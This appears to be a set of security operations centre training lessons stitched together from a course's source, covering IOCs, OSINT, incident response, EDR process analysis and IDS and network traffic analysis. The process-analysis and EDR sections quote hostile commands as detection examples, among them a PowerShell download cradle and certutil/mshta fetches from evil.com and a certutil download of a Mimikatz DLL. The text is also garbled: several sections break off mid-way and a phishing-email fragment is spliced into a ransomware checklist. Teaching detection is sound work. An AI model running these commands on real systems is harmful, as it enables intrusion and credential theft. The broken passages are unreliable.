\`\`\`
                    △
                   /│\\
                  / │ \\  TTPs (Hardest to change)
                 /  │  \\
                /───┼───\\
               /    │    \\  Tools
              /     │     \\
             /──────┼──────\\
            /       │       \\  Network/Host Artifacts
           /        │        \\
          /─────────┼─────────\\
         /          │          \\  Domain Names
        /           │           \\
       /────────────┼────────────\\
      /             │             \\  IP Addresses
     /              │              \\
    /───────────────┼───────────────\\
   /                │                \\  Hash Values (Easiest to change)

\`\`\`

## Using IOCs in the SOC

### Practical Workflow
1. **Receive IOC** - From threat feed or intel report
2. **Validate** - Check source reliability and freshness
3. **Search** - Query SIEM/EDR for matches
4. **Contextualize** - Understand what a match means
5. **Act** - Block, alert, or investigate further

### IOC Matching Example
\`\`\`
SIEM Query:
index=network sourcetype=firewall dest_ip IN (
  "185.234.218.45",
  "91.109.190.68",
  "45.89.127.34"
)

Results: 3 connections from HOST-PC-42 to 185.234.218.45
         First seen: 2024-01-15 03:22:45 UTC
         Last seen: 2024-01-15 03:45:12 UTC
\`\`\`

## IOC Quality Considerations

**Good IOCs:**
- Recent and timely
- Contextual information provided
- Verified by multiple sources
- Low false positive rate

**Poor IOCs:**
- Stale or outdated
- No context or attribution
- Single unverified source
- High false positive rate (common IPs, generic hashes)

# OSINT for SOC Analysts

**Open Source Intelligence (OSINT)** refers to intelligence collected from publicly available sources. For SOC analysts, OSINT is a powerful tool for enriching alerts and investigating threats.

## What is OSINT?

OSINT includes any publicly accessible information:

- Public websites and databases
- Social media platforms
- Government publications
- News and media reports
- Technical repositories (GitHub, etc.)
- DNS and WHOIS records
- Certificate transparency logs

## Essential OSINT Techniques for SOC

### 1. IP Address Research

**Key Information to Gather:**
- Geographic location
- ASN and ISP
- Reputation scores
- Historical activity
- Associated domains

**Example Workflow:**
\`\`\`
Suspicious IP: 185.234.218.45

Step 1: GeoIP Lookup → Russia, Moscow
Step 2: ASN Lookup → AS12345 - Suspicious Hosting Provider
Step 3: Reputation Check → Listed on 5 blocklists
Step 4: VirusTotal → 12/90 engines flag as malicious
Step 5: Shodan → Running nginx, multiple open ports

Conclusion: High-risk IP, likely malicious infrastructure
\`\`\`

### 2. Domain Investigation

**DNS Analysis:**
\`\`\`bash
# WHOIS lookup
whois suspicious-domain.com

# DNS records
dig suspicious-domain.com ANY

# Historical DNS
# Use SecurityTrails, PassiveTotal, etc.
\`\`\`

**Red Flags in Domains:**
- Recently registered (< 30 days)
- Privacy-protected WHOIS
- Cheap TLDs (.xyz, .top, .info)
- Similar to known brands (typosquatting)
- Random character strings (DGA)

### 3. File and Hash Analysis

**VirusTotal Workflow:**
1. Submit hash (don't upload sensitive files!)
2. Review detection ratio
3. Check behavior analysis
4. Look at relations (IPs, domains, other files)
5. Read community comments

### 4. Email Header Analysis

# The Incident Response Lifecycle

**Incident Response (IR)** is the organized approach to addressing and managing security breaches. Understanding the IR lifecycle is fundamental for every SOC analyst.

## What is an Incident?

A **security incident** is an event that:
- Violates security policies
- Threatens the confidentiality, integrity, or availability of systems
- May require a coordinated response

**Examples:**
- Malware infection on a workstation
- Successful phishing attack
- Data exfiltration detected
- Ransomware encryption
- Unauthorized access to sensitive data

## The NIST Incident Response Framework

The NIST framework defines four primary phases:

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                    INCIDENT RESPONSE LIFECYCLE                   │
├──────────────┬──────────────┬──────────────┬───────────────────┤
│              │              │              │                   │
│  Preparation │  Detection & │ Containment, │ Post-Incident     │
│              │  Analysis    │ Eradication, │ Activity          │
│              │              │ & Recovery   │                   │
│              │              │              │                   │
└──────────────┴──────────────┴──────────────┴───────────────────┘
       │              ↓              ↓                │
       │         INCIDENT        INCIDENT            │
       │         DETECTED        HANDLED             │
       └──────────────────────────────────────────────┘
                      CONTINUOUS IMPROVEMENT
\`\`\`

### Phase 1: Preparation

**Goal:** Build capability to respond effectively

**Activities:**
- Develop incident response plan
- Build and train the IR team
- Deploy detection and monitoring tools
- Create communication plans
- Conduct tabletop exercises

**SOC Analyst Role:**
- Know your tools and procedures
- Understand escalation paths
- Practice with simulated scenarios

### Phase 2: Detection & Analysis

**Goal:** Identify and understand the incident

**Activities:**
- Monitor alerts and reports
- Correlate events across sources
- Determine scope and impact
- Document initial findings
- Classify the incident

**Key Questions:**
\`\`\`
□ What happened?
□ When did it start?
□ What systems are affected?
□ What data is at risk?
□ How did the attacker get in?
□ Is the attack ongoing?
\`\`\`

### Phase 3: Containment, Eradication, & Recovery

**Containment Strategies:**

| Strategy | Description | Example |
|----------|-------------|---------|
| Short-term | Immediate action to stop spread | Isolate infected host |
| Long-term | Temporary fix while preparing cleanup | Block malicious IP at firewall |

**Eradication:**
- Remove malware and artifacts
- Patch vulnerabilities
- Reset compromised credentials
- Clean or reimage systems

**Recovery:**
- Restore from clean backups
- Validate system integrity
- Return to normal operations
- Monitor for reinfection

### Phase 4: Post-Incident Activity

**Goal:** Learn and improve

**Activities:**
- Conduct lessons learned meeting
- Update detection rules
- Improve procedures
- Document the incident fully
- Share intelligence (as appropriate)

**Lessons Learned Questions:**
1. What happened and when?
2. How well did we perform?
3. What could we do better?
4. What improvements are needed?
5. How do we prevent recurrence?

## IR Playbooks

Playbooks standardize response to common incident types:

\`\`\`
PHISHING PLAYBOOK

1. IDENTIFY
   □ Analyze reported email
   □ Extract IOCs (sender, links, attachments)
   □ Check if clicked/opened

2. CONTAIN
   □ Block sender/domain
   □ Remove email from mailboxes
   □ If clicked: isolate endpoint

3. ERADICATE
   □ Scan affected endpoints
   □ Remove any downloaded payloads
   □ Reset credentials if needed

4. RECOVER
   □ Clear user to resume work
   □ Confirm no persistence

5. LESSONS LEARNED
   □ Update email filters
   □ Conduct user awareness
   □ Document in incident log
\`\`\`

## SOC Analyst's IR Responsibilities

As an L1 analyst, you primarily handle:
- **Detection** - Identifying potential incidents
- **Initial Analysis** - First-level triage
- **Documentation** - Recording findings
- **Escalation** - Passing to IR team when needed
- **Support** - Assisting during active response
    `,

      "The NIST IR lifecycle has four phases: Preparation, Detection & Analysis, Containment/Eradication/Recovery, and Post-Incident",
      "Preparation before incidents occur is crucial for effective response",
      "Containment prevents spread while you work on eradication",
      "Post-incident lessons learned drive continuous improvement",

# Incident Classification & Severity

Properly classifying incidents ensures appropriate resource allocation and response speed. Not every security event deserves the same level of attention.

## Incident vs. Event vs. Alert

Understanding the hierarchy:

\`\`\`
     Events (Millions daily)
           │
           ↓ [Detection Rules]
           │
        Alerts (Thousands daily)
           │
           ↓ [Analyst Triage]
           │
       Incidents (Few per day/week)
\`\`\`

**Event:** Any observable occurrence
**Alert:** Event that triggers a detection rule
**Incident:** Validated security breach requiring response

## Incident Classification Categories

### By Attack Vector

| Category | Description | Examples |
|----------|-------------|----------|
| Malware | Malicious software infection | Ransomware, trojan, worm |
| Phishing | Deceptive communications | Email phishing, vishing |
| Unauthorized Access | Illegitimate system access | Brute force, credential stuffing |
| Data Breach | Unauthorized data exposure | Exfiltration, data leak |
| DoS/DDoS | Availability attacks | Service disruption |
| Insider Threat | Malicious employee activity | Data theft, sabotage |
| Web Attack | Application-layer attacks | SQLi, XSS, RCE |

### By Impact Type

- **Confidentiality** - Data exposure or theft
- **Integrity** - Data modification or corruption
- **Availability** - Service or system disruption

## Severity Levels

Most organizations use 4-5 severity levels:

### Severity Level Framework

# Initial Containment Actions

**Containment** is the critical phase where you stop the bleeding. Quick, decisive containment can mean the difference between a minor incident and a major breach.

## Containment Philosophy

> "Contain first, investigate second - but don't destroy evidence"

**Key Principles:**
1. Stop the spread of the attack
2. Preserve evidence for investigation
3. Minimize business disruption
4. Document all actions taken

## Common Containment Strategies

### Network Isolation

**Full Network Isolation:**
\`\`\`
Action: Disconnect host from network
When: Active ransomware, confirmed C2, lateral movement

Methods:
• Disable switch port
• Block at firewall
• EDR network isolation feature
• Disable network adapter (if physical access)
\`\`\`

**Selective Blocking:**
\`\`\`
Action: Block specific traffic
When: Known malicious IPs/domains, C2 beaconing

Methods:
• Firewall rules
• DNS sinkhole
• Proxy blocks
• WAF rules
\`\`\`

### Account Actions

\`\`\`
COMPROMISED ACCOUNT CONTAINMENT

1. Disable the account
   └─ AD: Disable in Users & Computers
   └─ Cloud: Suspend in admin console

2. Terminate active sessions
   └─ Force logout from all devices
   └─ Revoke OAuth tokens

3. Reset credentials
   └─ Password reset (force at next login)
   └─ Revoke/regenerate API keys

4. Review recent activity
   └─ Check login history
   └─ Review permission changes
\`\`\`

### Endpoint Containment

**EDR Containment:**
\`\`\`
Most EDR tools offer:
• Network isolation (blocks all except EDR traffic)
• Process termination
• File quarantine
• Remediation actions
\`\`\`

**Manual Containment:**
\`\`\`
If no EDR available:
• Power off (last resort - loses volatile data)
• Unplug network cable
• Login and disable network adapter
• Move to quarantine VLAN
\`\`\`

## Containment by Incident Type

### Malware Infection

\`\`\`
IMMEDIATE ACTIONS:
□ Isolate affected host(s) from network
□ Identify malware family if possible
□ Check for lateral movement indicators
□ Block C2 communications at firewall
□ Preserve memory for analysis (if possible)

DON'T:
✗ Immediately reboot/wipe (destroys evidence)
✗ Run antivirus before collecting artifacts
✗ Alert the attacker you've detected them
\`\`\`

### Phishing with Credential Compromise

\`\`\`
IMMEDIATE ACTIONS:
□ Reset user's password
□ Terminate all active sessions
□ Review account activity since compromise
□ Check for mail forwarding rules
□ Alert user and manager
□ Block sender domain/IP

ADDITIONAL STEPS:
□ Search for similar emails to other users
□ Check if MFA was bypassed
□ Review VPN/remote access logs
\`\`\`

### Ransomware

\`\`\`
CRITICAL - EVERY SECOND COUNTS!

□ IMMEDIATELY isolate affected systems
□ DO NOT power off (may trigger encryption)
□ Identify patient zero if possible
□ Block lateral movement paths
□ Disable network shares
□ Contact IR team/management ASAP

PRESERVE:
□ Ransom notes (file and screenshot)
□ Encrypted file samples

https://c0mpany-auth.evil.site/reset?id=a8b7c6...

IT Support Team

--- END EMAIL BODY ---
\`\`\`

**Red Flags Identified:**
\`\`\`
□ Sender domain uses "0" instead of "o" (c0mpany vs company)
□ Urgency tactics ("will expire in 24 hours")
□ Generic greeting ("Dear Employee")
□ External link disguised as internal
□ No SPF/DKIM authentication
\`\`\`

### User Contact

\`\`\`
PHONE CALL TO USER (9:35 AM)

Analyst: "Hi Sarah, this is the Security team. We noticed 
         you clicked a link in an email about password reset.
         Did you enter any credentials?"

Sarah: "Yes, it asked for my password and I typed it in.
        It said there was an error and to try again later."

Analyst: "Thank you for being honest. I'll need to secure 
         your account and ask you some questions. Please don't
         access any sensitive systems until we're done."
\`\`\`

**Critical Finding:** User entered credentials on phishing page!

# Process Analysis Basics

Understanding process behavior is fundamental to EDR investigation. This lesson covers how to analyze processes for signs of malicious activity.

## Process Fundamentals

Every Windows process has key attributes:

\`\`\`
PROCESS ATTRIBUTES

┌─────────────────────────────────────────────────────────────┐
│ IDENTIFICATION                                              │

└─────────────────────────────────────────────────────────────┘
\`\`\`

## Suspicious Process Indicators

### 1. Unusual Parent-Child Relationships

\`\`\`
SUSPICIOUS SPAWNING PATTERNS

Office Applications → Scripting Engines
├── WINWORD.EXE → powershell.exe    [!]
├── EXCEL.EXE → cmd.exe             [!]
├── OUTLOOK.EXE → wscript.exe       [!]

Browser → System Tools
├── chrome.exe → cmd.exe            [!]
├── firefox.exe → powershell.exe    [!]

Services → Unexpected Children
├── services.exe → cmd.exe          [!]
├── wmiprvse.exe → powershell.exe   [!]
\`\`\`

### 2. Suspicious Command Lines

**Encoded Commands:**
\`\`\`powershell
# Suspicious - Base64 encoded
powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0A...

# Suspicious - Download cradle
powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')

# Suspicious - Bypass flags
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden
\`\`\`

**Suspicious Parameters:**
\`\`\`cmd
# Hidden execution
cmd.exe /c start /min
wscript.exe //B //E:jscript

# LOLBAS usage
certutil.exe -urlcache -split -f http://evil.com/malware.exe
mshta.exe http://evil.com/payload.hta
\`\`\`

### 3. Unusual Process Paths

\`\`\`
EXPECTED LOCATIONS

powershell.exe  → C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\
cmd.exe         → C:\\Windows\\System32\\
svchost.exe     → C:\\Windows\\System32\\

SUSPICIOUS LOCATIONS

powershell.exe  → C:\\Users\\Public\\powershell.exe         [!]
svchost.exe     → C:\\Windows\\Temp\\svchost.exe            [!]
cmd.exe         → C:\\ProgramData\\cmd.exe                  [!]
\`\`\`

### 4. Process Masquerading

Attackers disguise processes:

\`\`\`
LEGITIMATE                          MASQUERADING
svchost.exe                        svch0st.exe (zero instead of 'o')
services.exe                       service.exe (missing 's')
csrss.exe                          cssrs.exe (letters swapped)
lsass.exe                          lsasss.exe (extra 's')
\`\`\`

## Common Attack Techniques

### Living Off the Land (LOLBAS)

Legitimate tools used maliciously:

| Tool | Malicious Use |
|------|---------------|
| certutil.exe | Download files |
| mshta.exe | Execute HTA files |
| regsvr32.exe | Execute scripts |
| rundll32.exe | Execute DLLs |
| wmic.exe | Process execution |
| bitsadmin.exe | Download files |

### Process Injection

Signs of process injection:

\`\`\`
INJECTION INDICATORS

1. Unexpected memory allocations
   └─ VirtualAlloc in remote process

2. Suspicious thread creation
   └─ CreateRemoteThread

3. Normal process with unusual behavior
   └─ notepad.exe making network connections

4. Hollowed processes
   └─ Process image doesn't match on-disk file
\`\`\`

## Baseline Knowledge: Normal Process Behavior

### Critical Windows Processes

\`\`\`
PROCESS: svchost.exe
Normal:
├── Parent: services.exe ONLY
├── Path: C:\\Windows\\System32\\svchost.exe
├── Command: svchost.exe -k [service group]
├── Multiple instances (normal)
Suspicious:
├── Parent other than services.exe
├── Running from wrong path
├── No -k parameter

PROCESS: lsass.exe
Normal:
├── Parent: wininit.exe
├── Path: C:\\Windows\\System32\\lsass.exe
├── Single instance only
├── High integrity level
Suspicious:
├── Multiple instances
├── Wrong parent or path
├── Credential dumping attempts

PROCESS: csrss.exe
Normal:
├── Parent: (no parent - first process)
├── Path: C:\\Windows\\System32\\csrss.exe
├── Session 0 and per user session
Suspicious:
├── Has a visible parent
├── Wrong path
├── Unusual child processes
\`\`\`

## Process Analysis Checklist

\`\`\`
□ Is the process name spelled correctly?
□ Is it running from the expected path?
□ Is the parent process legitimate?
□ Are the command-line arguments suspicious?
□ Is the process signed by a trusted publisher?
□ Is the behavior normal for this process type?
□ Are there network connections that are unusual?
□ Are child processes expected?
\`\`\`

    keyTakeaways: [
      "Process analysis requires understanding normal parent-child relationships",
      "Office apps spawning scripting engines is a critical red flag",
      "Unusual paths and misspelled names indicate masquerading",
      "LOLBAS techniques use legitimate tools for malicious purposes",
      "Know the normal behavior of critical Windows processes"

# Hands-On: EDR Investigation

Let's walk through a complete EDR investigation from alert to resolution.

## Scenario

\`\`\`
ALERT DETAILS

Alert Name: Credential Dumping Attempt Detected
Severity: CRITICAL
Confidence: 95%
Timestamp: 2024-01-15 02:34:17 UTC
Hostname: DC-PRIMARY
Username: SYSTEM
MITRE ATT&CK: T1003.001 - LSASS Memory Dumping

Detection: Process accessed LSASS memory with suspicious pattern
Process: rundll32.exe
Command: rundll32.exe C:\\Windows\\Temp\\debug.dll,DllMain
\`\`\`

## Step 1: Initial Assessment

### Alert Context

\`\`\`
CRITICAL FACTORS:
☑ Domain Controller - highest value target
☑ LSASS access - credential theft technique
☑ Unusual DLL location (Windows\\Temp)
☑ Running as SYSTEM - high privileges
☑ 2:34 AM - outside business hours

VERDICT: High priority, investigate immediately
\`\`\`

## Step 2: Process Tree Analysis

\`\`\`
PROCESS TREE

winlogon.exe (PID 512)
└── services.exe (PID 624)
    └── svchost.exe -k netsvcs (PID 892)
        └── WmiPrvSE.exe (PID 2048)          [1] WMI activity
            └── powershell.exe (PID 3156)    [2] PS execution
                └── cmd.exe (PID 3892)        [3] cmd child
                    └── rundll32.exe (PID 4212)[4] LSASS access

ANALYSIS:
[1] WmiPrvSE.exe - WMI can be used for remote execution
[2] PowerShell spawned from WMI - suspicious!
[3] cmd.exe child - executing commands
[4] rundll32.exe - the credential dumping attempt
\`\`\`

### Command Line Details

\`\`\`
[PID 2048] WmiPrvSE.exe
Command: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -Embedding
Analysis: WMI host process, can be abused for remote execution

[PID 3156] powershell.exe
Command: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C "IEX..."
Analysis: 
  • -NoP = No Profile
  • -NonI = Non-Interactive
  • -W Hidden = Hidden Window
  • -Exec Bypass = Bypass execution policy
  • ALL are evasion flags!

[PID 3892] cmd.exe
Command: cmd.exe /c certutil -urlcache -f http://10.0.1.50/debug.dll C:\\Windows\\Temp\\debug.dll
Analysis: Downloaded malicious DLL using certutil (LOLBAS)

[PID 4212] rundll32.exe
Command: rundll32.exe C:\\Windows\\Temp\\debug.dll,DllMain
Analysis: Executed downloaded DLL
\`\`\`

## Step 3: Network Analysis

\`\`\`
NETWORK CONNECTIONS

[PID 3892] 02:34:05 UTC
Protocol: HTTP
Destination: 10.0.1.50:80
File Downloaded: debug.dll (245KB)

WHOIS/LOOKUP: 10.0.1.50
└── Internal IP - likely compromised internal system
└── Hostname: WORKSTATION-42

CONCLUSION: Attack originated from internal host
\`\`\`

## Step 4: File Analysis

\`\`\`
FILE: C:\\Windows\\Temp\\debug.dll

Properties:
├── Size: 245,760 bytes
├── Created: 2024-01-15 02:34:05 UTC
├── Hash: SHA256 7e8f9a0b1c2d3e4f...
├── Signature: UNSIGNED
└── VirusTotal: 45/70 detections

Detection Names:
├── Mimikatz variant
├── Credential stealer
├── HackTool:Win64/Mikatz

VERDICT: Confirmed malicious - Mimikatz credential dumper
\`\`\`

## Step 5: Impact Assessment

\`\`\`
LSASS ACCESS ANALYSIS

Memory regions accessed:
└── Credential storage regions

Potential impact:
☑ All domain credentials at risk
☑ Password hashes exposed
☑ Kerberos tickets compromised
☑ Golden ticket possible

AFFECTED ACCOUNTS:
├── Domain Admins
├── Service accounts
├── Recently logged-in users
└── All cached credentials
\`\`\`

## Step 6: Attack Timeline

\`\`\`
TIMELINE RECONSTRUCTION

01:15:23 - Attacker compromises WORKSTATION-42 (initial access)
02:30:45 - WMI used for lateral movement to DC-PRIMARY
02:33:12 - PowerShell downloads attack tools
02:34:05 - Certutil downloads Mimikatz variant
02:34:15 - DLL executed via rundll32
02:34:17 - LSASS memory accessed (DETECTION)
02:34:45 - EDR terminates process (automatic response)

DWELL TIME: Approximately 1 hour 15 minutes
\`\`\`

## Step 7: Containment Actions

\`\`\`
IMMEDIATE ACTIONS TAKEN

[02:35:00] EDR Automatic Response
☑ Killed rundll32.exe process
☑ Quarantined debug.dll
☑ Alert generated

[02:40:00] SOC Response
☑ Isolated DC-PRIMARY from network
☑ Isolated WORKSTATION-42 (source)
☑ Notified IR team lead
☑ Initiated password reset for domain admins

[02:55:00] IR Team Actions
☑ Memory dump collected from DC
☑ Forensic imaging initiated
☑ krbtgt password reset scheduled
\`\`\`

## Step 8: Documentation

\`\`\`
INCIDENT SUMMARY

Ticket: INC-2024-0023
Severity: CRITICAL (1)
Category: Credential Theft - Mimikatz

Attack Chain:
1. Initial compromise of WORKSTATION-42 (unknown vector)
2. Lateral movement to DC-PRIMARY via WMI
3. Mimikatz variant downloaded and executed
4. LSASS memory accessed for credential dumping

Impact:
- Domain credentials likely compromised
- Full domain compromise possible

Containment:
- Both systems isolated
- Attack process terminated
- Malicious DLL quarantined

Required Actions:
- Reset all domain admin passwords
- Reset krbtgt password (twice, 10 hours apart)
- Investigate WORKSTATION-42 for initial vector
- Forest-wide credential reset recommended
\`\`\`

## Lessons Learned

**What EDR Did Well:**
- Detected LSASS access in real-time
- Automatically terminated the attack
- Provided full visibility into attack chain

**Investigation Key Points:**
- Process tree revealed lateral movement path
- Command line analysis showed evasion techniques
- Network data identified internal source

# Network Security Fundamentals

Understanding network basics is essential for SOC analysts who monitor and investigate network-based threats.

## The OSI Model for Security

\`\`\`
Layer 7 - Application   │ HTTP, DNS, SMTP         │ Web attacks, malware C2
Layer 6 - Presentation  │ SSL/TLS, encryption     │ Cert issues, downgrade attacks
Layer 5 - Session       │ Sessions, auth          │ Session hijacking
Layer 4 - Transport     │ TCP, UDP                │ Port scans, SYN floods
Layer 3 - Network       │ IP, ICMP, routing       │ IP spoofing, DDoS
Layer 2 - Data Link     │ MAC, switches           │ ARP poisoning, MAC spoofing
Layer 1 - Physical      │ Cables, signals         │ Physical access, tapping
\`\`\`

## Key Protocols for SOC Analysts

### TCP/IP Basics

\`\`\`
TCP THREE-WAY HANDSHAKE

Client                    Server
  │                         │
  │ ────── SYN ──────────→ │  "Can we connect?"
  │                         │
  │ ←───── SYN-ACK ─────── │  "Yes, let's connect"
  │                         │
  │ ────── ACK ──────────→ │  "Great, we're connected"
  │                         │
  │ ←───── DATA ──────────→│  (Communication)

SECURITY RELEVANCE:
• SYN flood = Many SYN, no ACK (DoS attack)
• Half-open connections = SYN scan (recon)
• Unusual flags = Evasion or crafted packets
\`\`\`

### Common Ports to Know

| Port | Protocol | Service | Security Relevance |
|------|----------|---------|-------------------|
| 21 | TCP | FTP | File exfiltration |
| 22 | TCP | SSH | Remote access |
| 23 | TCP | Telnet | Legacy, unencrypted |
| 25 | TCP | SMTP | Email, spam |
| 53 | UDP/TCP | DNS | C2, tunneling |
| 80 | TCP | HTTP | Web traffic |
| 443 | TCP | HTTPS | Encrypted web |
| 445 | TCP | SMB | Lateral movement |
| 3389 | TCP | RDP | Remote desktop |
| 8080 | TCP | HTTP Proxy | Alt web ports |

### DNS Fundamentals

\`\`\`
DNS QUERY FLOW

User types: www.example.com
     │
     ↓
┌─────────────────┐
│ Local Resolver  │ ← Check cache first
└────────┬────────┘
         │ (if not cached)
         ↓
┌─────────────────┐
│ Root DNS (.com) │
└────────┬────────┘
         ↓
┌─────────────────┐
│ TLD DNS         │ 
└────────┬────────┘
         ↓
┌─────────────────┐
│ Authoritative   │ ← Returns IP: 93.184.216.34
└─────────────────┘

SECURITY USES:
• Malware domains → C2 communication
• DNS tunneling → Data exfiltration
• DGA domains → Botnet communication
• DNS poisoning → Redirect to malicious sites

# IDS/IPS Basics

Intrusion Detection and Prevention Systems are critical network security tools that SOC analysts interact with daily.

## Understanding IDS vs IPS

\`\`\`
IDS (Intrusion Detection System)
├── Passive monitoring
├── Alerts only, no blocking
├── Connected via SPAN/TAP
├── No impact on network latency
└── "Alarm system"

IPS (Intrusion Prevention System)
├── Active inline deployment
├── Can block/drop malicious traffic
├── Must handle traffic in real-time
├── Can impact latency if overloaded
└── "Security guard"
\`\`\`

## Detection Methods

### Signature-Based Detection

\`\`\`
HOW IT WORKS:
Known attack pattern → Rule created → Traffic matched → Alert

EXAMPLE SNORT RULE:
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 
(msg:"ET EXPLOIT MS17-010 SMB Remote Code Execution"; 
 content:"|00 00 00|"; depth:3; 
 content:"|ff|SMB"; within:5;
 sid:2024217; rev:1;)

BREAKDOWN:
• alert tcp: Generate alert for TCP traffic
• $EXTERNAL_NET any: From any external IP/port
• $HOME_NET 445: To internal network, SMB port
• content: Specific bytes to match
• msg: Description of what was detected

STRENGTHS:
✓ Low false positives for known threats
✓ Fast matching
✓ Easy to understand

WEAKNESSES:
✗ Cannot detect unknown attacks
✗ Evasion via encoding/encryption
✗ Requires constant updates
\`\`\`

### Anomaly-Based Detection

\`\`\`
HOW IT WORKS:
Learn baseline → Monitor for deviation → Alert on anomalies

EXAMPLE BASELINE:
Normal DNS queries: 50-200/hour
Normal query length: 15-50 characters
Normal TTL requests: Standard values

ANOMALY DETECTED:
DNS queries: 5,000/hour          [!] Volume spike
Query length: 150+ characters    [!] DNS tunneling?
Unusual TXT record requests      [!] Data exfiltration?

STRENGTHS:
✓ Can detect unknown attacks
✓ Catches behavioral changes
✓ Good for insider threats

WEAKNESSES:
✗ Higher false positive rate
✗ Requires learning period
✗ Baseline can drift
\`\`\`

## Common IDS/IPS Solutions

| Solution | Type | Key Features |
|----------|------|--------------|
| Snort | Open Source | Signature-based, widely used |
| Suricata | Open Source | Multi-threaded, high performance |
| Zeek (Bro) | Open Source | Network analysis framework |
| Palo Alto | Commercial | NGFW with IPS capabilities |

## Understanding IDS Alerts

### Alert Anatomy

\`\`\`
IDS ALERT EXAMPLE

Timestamp: 2024-01-15 14:32:45 UTC
Signature: ET MALWARE Win32/Emotet CnC Checkin
SID: 2024892
Priority: 1 (High)
Source: 10.0.1.108:49822
Destination: 185.234.218.45:443
Protocol: TCP

Raw Packet:
[Hex dump of matching traffic]

Classification: A Network Trojan was detected
\`\`\`

### Alert Priorities

\`\`\`
PRIORITY LEVELS

Priority 1: High Severity
├── Active exploitation attempts
├── Known malware communication
├── Critical vulnerabilities

Priority 2: Medium Severity
├── Suspicious activity
├── Policy violations
├── Potential threats

Priority 3: Low Severity
├── Informational alerts
├── Reconnaissance activity
├── Minor policy violations
\`\`\`

## Alert Triage Process

\`\`\`
IDS ALERT TRIAGE WORKFLOW

1. READ THE ALERT
   └─ What signature fired?
   └─ What classification?
   └─ Source and destination?

2. VALIDATE THE ALERT
   └─ Is the signature relevant?
   └─ Is the target vulnerable?
   └─ Is this expected behavior?

3. INVESTIGATE
   └─ Check source IP reputation
   └─ Review related traffic
   └─ Examine packet content

4. CORRELATE
   └─ Other alerts from same source?
   └─ EDR alerts on destination?
   └─ Similar activity elsewhere?

5. VERDICT
   └─ True Positive → Respond
   └─ False Positive → Document/Tune
   └─ Needs more info → Investigate further
\`\`\`

## Common False Positive Scenarios

\`\`\`
FREQUENT FALSE POSITIVES

1. Vulnerability Scanners
   └─ Internal security tools triggering exploit signatures
   └─ Solution: Whitelist scanner IPs

2. Penetration Testing
   └─ Authorized testing looks like attacks
   └─ Solution: Scheduled testing windows, whitelist

3. Legitimate Software
   └─ Some apps use techniques that look suspicious
   └─ Solution: Application baseline, exceptions

4. Encrypted Traffic
   └─ Partial signature matches in encrypted data
   └─ Solution: Context-aware tuning

5. Generic Signatures
   └─ Overly broad detection patterns
   └─ Solution: Threshold adjustments, refinement
\`\`\`

## Tuning Best Practices

\`\`\`
TUNING APPROACH

DON'T: Disable rules that cause false positives
DO: Tune with specific exceptions

Example:
Before: Rule fires on all traffic to port 445
After: Rule excludes traffic from file servers to expected destinations

DOCUMENTATION:
• Why was tuning needed?
• What was the false positive?
• What exception was created?
• Who approved the change?

    keyTakeaways: [
      "IDS monitors and alerts; IPS can actively block threats",
      "Signature-based detection is fast but only catches known threats",
      "Anomaly-based detection can find unknown attacks but has more false positives",
      "Alert triage requires validating relevance and investigating context",
      "Tuning should create specific exceptions, not disable rules entirely"

# Network Traffic Analysis

Network traffic analysis involves examining network data to detect and investigate security threats. This skill is essential for SOC analysts.

## Types of Network Data

### 1. Packet Captures (PCAP)

\`\`\`
PCAP = Full packet capture

Contains:
├── Complete packet headers
├── Full payload data
├── Timing information
└── All protocol details

Use Cases:
├── Deep packet inspection
├── Malware analysis
├── Forensic investigation
└── Protocol analysis

Challenges:
├── Large storage requirements
├── Privacy concerns (full content)
├── Performance impact
└── Encryption limits visibility
\`\`\`

### 2. NetFlow/IPFIX

\`\`\`
NETFLOW = Connection metadata

Contains:
├── Source/Destination IP
├── Source/Destination Port
├── Protocol
├── Byte/Packet counts
├── Timestamps
└── Flags

Does NOT Contain:
├── Payload data
├── Application content
└── File transfers

Use Cases:
├── Traffic volume analysis
├── Baseline establishment
├── Anomaly detection
├── Connection tracking
\`\`\`

### 3. DNS Logs

\`\`\`
DNS LOGS

Query:  timestamp | client_ip | query_name | query_type
Response: timestamp | query_name | response_ip | TTL

Security Analysis:
├── Known malicious domains
├── DGA pattern detection
├── DNS tunneling
├── Fast flux networks
└── Typosquatting
\`\`\`

## Traffic Analysis Techniques

### Baseline Comparison

\`\`\`
ESTABLISHING BASELINES

Step 1: Collect normal traffic patterns
- Time of day variations
- Day of week patterns
- Seasonal variations

Step 2: Define thresholds
- Volume: Normal 10GB/day, Alert at 15GB+
- Connections: Normal 5,000/hour, Alert at 10,000+
- Countries: Normal US/EU, Alert on unexpected geolocations

Step 3: Alert on deviations
- Volume spikes: Possible exfiltration
- Connection spikes: Possible DDoS or scanning
- New destinations: Possible C2
\`\`\`

### Beaconing Detection

\`\`\`
BEACONING PATTERN

Malware often "phones home" at regular intervals:

Timeline visualization:
|----|----|----|----|----|----|----|----|  (Regular intervals)
 15m  15m  15m  15m  15m  15m  15m  15m

Detection Indicators:
├── Regular time intervals (with slight jitter)
├── Similar packet sizes
├── Persistent over long periods
├── Often to unusual destinations
└── May be encrypted (HTTPS)

Analysis Query (conceptual):
GROUP connections BY destination
CALCULATE interval_stddev
WHERE interval_stddev < threshold
AND connection_count > minimum
→ Potential beaconing behavior
\`\`\`

### Data Exfiltration Indicators

\`\`\`
EXFILTRATION RED FLAGS

Volume Anomalies:
├── Large uploads to unknown destinations
├── Unusual outbound traffic spikes
├── After-hours data transfers
└── Compressed/encrypted file transfers

Protocol Anomalies:
├── DNS with large TXT responses
├── ICMP with unexpected payload sizes
├── HTTP POST with large bodies
└── Unusual protocol on standard ports

Destination Anomalies:
├── Personal cloud storage
├── New external IPs
├── Tor exit nodes
└── VPN/proxy services
\`\`\`

## Practical Analysis Examples

### Example 1: Suspicious HTTP Traffic

\`\`\`
SCENARIO:
Host 10.0.1.108 making HTTP requests to 185.234.218.45

ANALYSIS:

GET /gate.php?data=aG9zdG5hbWU9V09SS1NUQVRJT04tMDg= HTTP/1.1
Host: 185.234.218.45
User-Agent: Mozilla/5.0

OBSERVATIONS:
1. Direct IP access (no domain) → Suspicious
2. "gate.php" → Common malware endpoint name
3. Base64 data in URL → Data exfiltration
4. Regular interval requests → Beaconing

DECODE BASE64:
